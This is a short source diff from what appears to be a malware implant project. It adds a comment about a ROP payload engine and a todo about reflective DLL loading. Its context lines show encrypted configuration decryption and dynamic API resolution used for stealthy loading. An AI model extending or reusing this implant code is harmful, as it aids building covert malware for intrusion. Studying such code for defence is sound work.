@@ -1,4 +1,5 @@
 #include <core/corelib.hpp>
+// todo: the idea of "ROP-Engine" is just to make writing rop payloads/programming easier.
 
 VOID Entrypoint(HMODULE Base) {
     Memory::ContextInit();
@@ -69,7 +70,7 @@ namespace Implant {
         Parser::ParserMemcpy(&Parser, &Ctx->Config.Key, nullptr);
         Xtea::XteaCrypt(S_CAST(PBYTE, Parser.Buffer), Parser.Length - 0x12, Ctx->Config.Key, FALSE);
 
-        // todo: reflective loading? maybe https://github.com/bats3c/DarkLoadLibrary
+        // todo: add reflective loading? maybe https://github.com/bats3c/DarkLoadLibrary
         if ((FPTR(Ctx->win32.LoadLibraryA, Ctx->Modules.kernel32, LOADLIBRARYA))) {
             if (
                 !(Ctx->Modules.crypt32 = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
